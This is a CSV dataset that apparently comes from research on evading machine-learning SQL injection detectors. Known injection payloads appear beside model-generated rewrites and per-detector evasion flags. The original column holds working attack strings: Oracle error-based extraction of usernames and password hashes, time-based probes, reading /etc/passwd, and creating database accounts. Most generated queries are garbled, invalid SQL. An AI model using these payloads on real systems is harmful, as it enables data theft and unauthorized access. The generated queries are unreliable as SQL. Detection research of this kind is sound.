original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.ALL_USERS AND NOT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(USERNAME) FROM (SELECT SELECT MIN(USERNAME) FROM),0,1,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.USER$ WHERE NOT SELECT SELECT SELECT MIN(SELECT) FROM SELECT SELECT SELECT MIN(SELECT) FROM SYS.USER$),0,0,1,1,1,1,1
INSERT INTO table,SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = 'SQ injection',1,0,1,1,1,1,1
ORDER BY 16--,"SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query FROM 16-- if NOT SQL_inject = ""valid""",1,1,1,1,1,1,1
"' and 0=benchmark(3000000,MD5(1))%20--","SELECT MIN(3000000,MD5(1))%20-- - SELECT MIN(3000000,MD5(1)) FROM SQL injection AS evade_susc injection detection",1,1,0,0,1,0,0
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT SELECT SUM(SQL) FROM (SELECT AS t1 JOIN SQL injection) FROM (SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT FROM (SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT ,1,0,1,1,1,1,1
) waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#","SELECT MIN(1000000,MD5('A)) FROM SQL injection'",1,1,0,0,1,0,0
23 or 1=1; --,SELECT NOT SQL_inject FROM query: 23 ORDER BY query: 1,1,0,1,1,1,1,1
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injections,1,1,0,0,0,0,0
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SELECT SELECT FROM table2 WHERE NOT column2 = 'SQ',0,0,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.ALL_USERS AND NOT SELECT SELECT SELECT SELECT MIN(USERNAME) FROM (SELECT SELECT MIN(USERNAME) FROM) AS _local_host_address(SELECT) FROM (SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM) AS _users) FROM (SELECT MIN(USERNAME) FROM (SELECT SUM(SELECT AS t1 JOIN SQL_host_address(SELECT FROM SYS.ALL_usERS) FROM (SELECT SELECT FROM SELECT SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM SYS.ALL_usERS) FROM (SELECT,0,1,0,1,1,1,0
or 1=1,SELECT * FROM query: or 1 = 1,1,1,0,0,1,0,0
' having 1=1--,SELECT MIN(sql injection) FROM SQL Query: '1=1-- for',1,1,1,0,1,1,0
"' union select 1,load_file('/etc/passwd'),1,1,1;",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
UNION ALL SELECT 'INJ'||'ECT'||'XXX'#,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--","SELECT MIN(1000000,SQ) FROM SQL, SELECT MIN(1000000,SQ) FROM 1,SLEEP(5),BENCHMARK(1000000),21,28,29-- if you are done",1,1,1,0,1,1,0
1' and 1=(select count(*) from tablenames); --,SELECT MIN(*) FROM tablenames); * FROM SQL injection detection,1,1,1,1,1,1,1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23","SELECT 3000000,MD5(1) FROM SQL AS t1 JOIN (SELECT NULL, NULL) FROM Query: +if(dull) query: +if(dull) query: +if(dull) query: +if(dull) query: +if(dull) query: +if(dull) query: +if(dull) query: +if(dull) query: +if(dull) FROM table WHERE NOT SQL = 'yes')",0,1,0,0,1,0,0
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SELECT SELECT FROM table2 WHERE NOT column2 = 'SQ',0,0,1,1,1,1,1
1' and 1=(select count(*) from tablenames); --,SELECT MIN(*) FROM tablenames); * FROM SQL injection detection,1,1,1,1,1,1,1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL,1,0,1,1,1,1,1
’ or ‘1’=’1,"SELECT * FROM SQL_injector, Query: 'yes', '1' FROM query: SELECT * FROM query: 'yes' FROM query: 'yes', 'yes', 'yes'",1,0,1,0,1,1,0
ORDER BY 24#,"SELECT * FROM 24# WHERE NOT SQL_injection = ""valid""",1,1,1,1,1,1,1
ORDER BY 23,SELECT * FROM Query: ORDER BY 23,0,0,1,1,1,1,1
') or ('a'='a,SELECT DISTINCT'sql injection' FROM SQL SELECT SELECT DISTINCT'sql injection' FROM query: 'yes' ORDER BY 'a',1,0,1,1,0,1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT SELECT DISTINCT SELECT DISTINCT SELECT FROM dba_role_privs WHERE GRANTEE= 'SYS.LOGINUSER'),0,0,1,1,1,1,1
"and (select substring(@@version,2,1))='y'","SELECT MIN(@@version,2,1) FROM SQL injection detection",1,1,1,1,1,1,1
"' || myappadmin.adduser('admin', 'newpass') || '",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
SELECT COUNT(*) FROM game;,SELECT query: SELECT COUNT(*) FROM game;sql injection ='sq injection' AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
1 or sleep(__TIME__)#,"SELECT NOT SQL_inject_name, COUNT(*) FROM query: 1 OR NOT __TIME__) ='sql injection'",1,1,1,0,1,1,0
SELECT * FROM Users;,SELECT * FROM Users;SELECT SQL FROM *SELECT * FROM SQL AS T1 JOIN Query: SELECT * FROM Users AS T2 ON T1.user_name = 'SQL',1,1,1,1,1,1,1
INSERT INTO table,SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = 'SQ injection',1,0,1,1,1,1,1
"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",SELECT MIN(select%20if(count(*)) FROM SQL injection_diagnosis WHERE NOT SQL_injection_method = 'evade',1,1,0,0,1,0,0
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM query,1,0,1,1,1,1,1
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20'0:0:20'%20--) FROM SQL injections,1,1,0,0,0,0,0
ORDER BY 14--,"SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT FROM 14-- AS t1 JOIN SQL injection = ""sql"" FROM query: ORDER BY 14-- ORDER BY 14--",0,1,1,1,1,1,1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM query,1,0,1,1,1,1,1
ORDER BY 24,SELECT * FROM query: ORDER BY 24,0,0,1,1,1,1,1
)%20waitfor%20delay%20'0:0:20'%20/*,SELECT MIN(%20waitfor%20delay%20'0:0:20'%20/*) FROM SQL injections,1,1,0,0,0,0,0
"'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --","SELECT DISTINCT esq_injection FROM SQL SELECT SELECT MIN(substring((select @@version),24,1) FROM query: '0:0:2'",1,1,1,0,1,1,0
')),SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
SELECT COUNT(*) FROM game;,SELECT query: SELECT COUNT(*) FROM game;sql injection ='sq injection' AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,1,1,1,1,1,1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))","SELECT MIN(SQL) FROM SQL injection_detect_code WHERE NOT SELECT MIN(UNION) FROM SQL_INSTRUCTOR_0, SELECT MIN(UNION) FROM query",1,1,1,1,1,1,1
INSERT INTO table,SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = 'SQ injection',1,0,1,1,1,1,1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--","SELECT MIN(1000000,SQ) FROM SQL, SELECT MIN(1000000,SQ) FROM 1,SLEEP(5),BENCHMARK(1000000,MD5(1000000) FROM SQL JOIN detection of SQL, 'DisCTION' FROM SQL JOIN SELECT MIN(1000000,SQ) FROM SQL JOIN Query: ORDER BY,SQ",1,1,1,0,1,1,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"') and 0=benchmark(3000000,MD5(1))%20/*","SELECT MIN(3000000,MD5(1))%20/*) FROM SQL injections",1,1,0,0,1,0,0
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL,1,1,0,0,1,0,0
ORDER BY 8#,"SELECT * FROM query: SELECT query: SELECT query: SELECT query_from FROM 8# WHERE NOT SQL_inject = ""valid"" AND NOT query_offering = ""done""",1,0,1,1,1,1,1
"' union (select NULL, NULL, (select @@version)) --",SELECT MIN(select) FROM SQL injection_description WHERE NOT select @@version) = 'example',0,0,1,0,1,1,0
"'),NULL)%20waifor%20delay%20'0:0:20'%20/*",SELECT MIN(%20waifor%20delay%20'0:0:20'%20/*) FROM SQL injections,1,1,0,0,0,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT SELECT DISTINCT SELECT DISTINCT SELECT FROM dba_role_privs WHERE GRANTEE= 'SYS.LOGINUSER'),0,0,1,1,1,1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,1,0,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,0,1,1,1,1,1
"""),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT * FROM SQL_Injector WHERE NOT NULL IN (SELECT NULL FROM query),1,0,1,1,1,1,1
"or benchmark(50000000,MD5(1))#","SELECT NOT SQL_inject_name, COUNT(*) FROM query: or benchmark(50000000,MD5(1))# FROM query: or query: or benchmark(50000000,MD5(1))# FROM query: or query: or benchmark(50000000,MD5(1))# = ""valid""",1,1,0,0,1,0,0
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--","SELECT MIN(3000000,MD5(1)) FROM SQL injection_diagnosis WHERE NOT SELECT '+if(benchmark(3000000,MD5(1)) FROM SQL injection'",1,1,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",SELECT MIN(SELECT) FROM (SELECT SELECT DISTINCT DISTINCT DISTINCT /// FROM SQL_inaddr.get_host_address(SELECT) FROM (SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM) AS _binaddr.get_host_address((SELECT) FROM (SELECT SUM(SELECT AS t FROM SQL injection) FROM (SELECT MIN(SELECT MIN(SELECT) FROM SELECT MIN(SELECT) FROM SQL_host_address((SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT) FROM (SELECT MIN(SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT) FROM (SELECT MIN(SELECT) FROM SELECT SELECT SELECT MIN(SELECT) FROM SELECT SELECT MIN(SELECT) FROM (SELECT SEL,0,0,0,0,1,0,0
' group by userid having 1=1--,SELECT MIN(sql injection) FROM SQL injection detection GROUP BY Query: 'userrid',1,0,1,1,1,1,1
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,SELECT DISTINCT SELECT DISTINCT sys.all_tab_columns) FROM sys.all_tab_address((SELECT) FROM sys.all_tab_columns) AND 'i'='i',0,1,0,0,0,0,0
INSERT INTO Documents WHERE ID=x,SELECT SQL FROM Documents WHERE ID = 'x',1,0,0,1,1,1,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#","SELECT, COUNT(*) FROM SQL injection detection WHERE NOT SELECT 'INJ'||'XXX'",1,1,1,1,1,1,1
""")) and 0=benchmark(3000000,MD5(1))%20%23","SELECT 3000000,MD5(1))%20%23 FROM SQL AS T1 JOIN query: 0 = benchmark(3000000,MD5(1))%20%23 WHERE NOT SQL_inject = 'valid' AND NOT STRFTIME('%y20%23) = 0 = benchmark(3000000,MD5(1))%20%23",0,1,0,0,0,0,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--","SELECT, COUNT(*) FROM SQL injection detection WHERE NOT SELECT 'INJ'||'XXX'",1,1,1,1,1,1,1
"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
SELECT * FROM Users;,SELECT * FROM Users;SELECT SQL FROM *SELECT * FROM SQL AS T1 JOIN Query: SELECT * FROM Users AS T2 ON T1.user_name = 'SQL',1,1,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.ALL_USERS AND NOT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(USERNAME) FROM (SELECT SELECT MIN(USERNAME) FROM),0,1,1,1,1,1,1
INSERT INTO Documents WHERE ID=x,SELECT SQL FROM Documents WHERE ID = 'x',1,0,0,1,1,1,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--","SELECT MIN(6,4,5,6--) FROM SQL injection'",1,1,1,0,0,0,0
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#",SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL,1,1,0,0,1,0,0
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",SELECT MIN(USER()) FROM SQL SELECT SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL SELECT SELECT MIN(USER()) FROM SQL,1,1,0,0,1,0,0
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*","SELECT * FROM SQL AS _valid_sq_injector WHERE NOT SELECT* FROM query: ""+if(benchmark(3000000,MD5(1)) = 'valid'",0,1,0,0,1,0,0
INSERT INTO table,SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = 'SQ injection',1,0,1,1,1,1,1
ORDER BY SLEEP(5)#,SELECT * FROM SLEEP(5)# FROM SQL AS t1 JOIN query: orDER BY query: orDER BY SLEEP(5)#,0,1,1,1,1,1,1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--","SELECT MIN(1000000,MD5(1000000) FROM SQL_Injection)",1,1,1,0,1,1,0
""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","SELECT * FROM SQL_injector WHERE NOTNULL IN (SELECTNULL,NULL) FROM query WHERE query = ""yes"" ORDER BY query",1,0,1,1,1,1,1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS t1 JOIN Query: ""+if(benchmark(3000000,MD5(1)"") FROM query: ""SQL injection"" FROM query: ""+if(benchmark(3000000,MD5(1)"" AND NOT query: ""+if(benchmark(3000000,MD5(1)"") AND NOT query: ""+if(benchmark(3000000,MD5(1)""",0,1,0,0,1,0,0
' or '1'='1,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
""")) and 0=benchmark(3000000,MD5(1))%20--","SELECT 3000000,MD5(1))%20-- FROM SQL AS t1 JOIN query: 0 = query: 0",0,1,0,0,0,0,0
'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --,SELECT MIN(sysadmin) FROM SQL injection',1,1,1,1,1,1,1
ORDER BY 13--,SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT FROM FROM SELECT SQL FROM 13-- ORDER BY 13--,1,1,1,1,1,1,1
'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,SELECT DISTINCT > 0 FROM SQL injection_description WHERE NOT if not(select serverproperty('isintegratedsecurityonly)',1,0,1,1,1,1,1
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,SELECT 7423 = 7423 AND NOT SELECT SELECT 7423 FROM SQL-Injection SELECT 7423 FROM SELECT 7423 AS _SELECT 7423 FROM xcjl--,1,1,1,1,1,1,1
'));waitfor delay '0:0:__TIME__'--,SELECT MIN(duration) FROM SQL injection detection,1,0,1,1,1,1,1
ORDER BY 24#,"SELECT * FROM 24# WHERE NOT SQL_injection = ""valid""",1,1,1,1,1,1,1
' or 'something' like 'some%',SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))","SELECT MIN(-3+5,bin(15) FROM SQL injection detection)",1,1,0,1,1,1,0
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL,1,0,1,1,1,1,1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS t1 JOIN Query: ""+if(benchmark(3000000,MD5(1))"" FROM query: ""+if(benchmark(3000000,MD5(1))"" AND NOT SQL_injection = ""SQL""",0,1,0,0,1,0,0
' or 'a'='a,SELECT MIN(sql injection) FROM SQL SELECT SELECT DISTINCT sysfunction FROM query: 'yes' ORDER BY SELECT DISTINCT sysfunction_code,1,0,1,1,1,1,1
) waitfor delay '0:0:20' /*,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
SELECT COUNT(*) FROM game;,SELECT query: SELECT COUNT(*) FROM game;sql injection ='sq injection' AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT * FROM SQL_injector WHERE NOT NULL IN (SELECTNULL FROM Query WHERE NULL = 'SQ'),1,0,1,1,1,1,1
SELECT COUNT(*) FROM game;,SELECT query: SELECT COUNT(*) FROM game;sql injection ='sq injection' AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,SELECT SELECT MIN(SELECT) FROM SQL injection_diagnoses WHERE NOT i'= 'exas',0,0,1,0,1,1,0
"UNION ALL SELECT 1,2,3",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#","SELECT MIN(1000000,MD5(000000) FROM SQL_Injection)",1,1,1,0,1,1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT SELECT DISTINCT SELECT DISTINCT SELECT FROM dba_role_privs WHERE GRANTEE= 'SYS.LOGINUSER'),0,0,1,1,1,1,1
"insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))",SELECT DISTINCT'sql injection' FROM SQL_injection,1,0,1,1,1,1,1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--","SELECT MIN(1000000,MD5(000000) FROM SQL_Injection) FROM 1,SLEEP(5),BENCHMARK(1000000,MD5(1000000) FROM SQL_Injection)",1,1,1,0,1,1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.ALL_USERS AND NOT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(USERNAME) FROM (SELECT SELECT MIN(USERNAME) FROM),0,1,1,1,1,1,1
'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,SELECT DISTINCT > 0 FROM SQL injection_description WHERE NOT if not(select serverproperty('isintegratedsecurityonly)',1,0,1,1,1,1,1
"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT * FROM SQL_injector WHERE NOT NULL IN (SELECTNULL FROM query),1,0,1,1,1,1,1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*","SELECT 3000000,MD5(1) FROM SQL AS t1 JOIN (SELECT NULL, NULL) FROM Query: +if(bnchmark(3000000,MD5(1)) AS t2 ON t1.number = 296 ORDER BY NULL LIMIT 1)",0,1,0,0,0,0,0
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
));waitfor delay '0:0:__TIME__'--,SELECT MIN(duration) FROM SQL injection detection,1,0,1,1,1,1,1
") and 0=benchmark(3000000,MD5(1))%20%23","SELECT 3000000,MD5(1))%20%23 FROM SQL query: 0 = query: 0 ORDER BY query: 0",1,1,0,0,0,0,0
AND 1083=1083 AND (1427=1427,SELECT * FROM SQL AS t1 JOIN query: AND t1.1427 = 1427 AND NOT t1.sql ='sq injection',0,1,1,1,0,1,0
